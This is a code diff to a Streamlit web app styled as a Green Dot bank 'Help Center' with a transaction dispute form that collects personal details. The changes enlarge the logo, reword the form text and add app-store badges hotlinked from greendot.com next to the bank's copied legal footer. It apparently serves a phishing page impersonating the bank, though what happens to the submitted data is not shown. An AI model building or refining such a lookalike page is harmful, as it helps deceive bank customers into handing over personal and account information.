@@ -38,7 +38,7 @@ st.markdown("""<style>
 }
 
 /* Desactivar clics en textos y logos para evitar que actúen como botones */
-h1, h2, h3, p, [data-testid="stImage"] {
+h1, h2, h3, [data-testid="stImage"] {
     pointer-events: none !important;
     user-select: none !important;
 }
@@ -67,6 +67,15 @@ input {
     border: 1px solid #333 !important;
 }
 
+.app-promo-container {
+    background-color: #111111;
+    padding: 40px 20px;
+    text-align: center;
+    border-radius: 12px;
+    margin: 30px 0;
+    border: 1px solid #222;
+}
+
 .legal-footer {
     font-size: 10px;
     color: #444;
@@ -78,10 +87,10 @@ input {
 </style>""", unsafe_allow_html=True)
 
 if os.path.exists('logo.svg'):
-    st.image('logo.svg', width=120)
+    st.image('logo.svg', width=150)
 
 st.title("Help Center")
-st.write("Submit your transaction dispute below.")
+st.write("Please fill out the form below to submit your claim.")
 
 with st.form("dispute_form", clear_on_submit=True):
     nombre = st.text_input("Full Name")
@@ -97,6 +106,15 @@ if submitted:
         st.success("✅ Claim received. We will review it shortly.")
     else:
         st.error("⚠️ All fields are required.")
+
+# SECCIÓN DE APP STORES RESTAURADA
+st.markdown("""<div class='app-promo-container'>
+    <h3 style='color:white;'>Download the Green Dot app</h3>
+    <div style='display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; margin-top:20px;'>
+        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='150'>
+        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='150'>
+    </div>
+</div>""", unsafe_allow_html=True)
 
 st.markdown("""<div class='legal-footer'>
 Green Dot cards are issued by Green Dot Bank, Member FDIC. ©2026 Green Dot Bank. 
